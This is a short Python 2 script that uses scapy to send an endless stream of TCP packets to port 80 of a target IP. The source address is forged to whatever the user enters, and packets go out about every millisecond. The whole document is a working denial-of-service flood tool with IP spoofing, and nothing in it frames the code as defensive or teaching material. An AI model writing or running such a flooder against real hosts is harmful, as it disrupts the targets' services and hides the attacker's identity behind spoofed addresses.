from scapy.all import *

src = raw_input("Enter the Source IP ")
target = raw_input("Enter the Target IP ")
srcport = int(raw_input("Enter the Source Port "))
i=1
while True: 
	IP1 = IP(src=src, dst=target)
	TCP1 = TCP(sport=srcport, dport=80)
	pkt = IP1 / TCP1
	send(pkt,inter= .001)
	print "packet sent ", i
	i=i+1
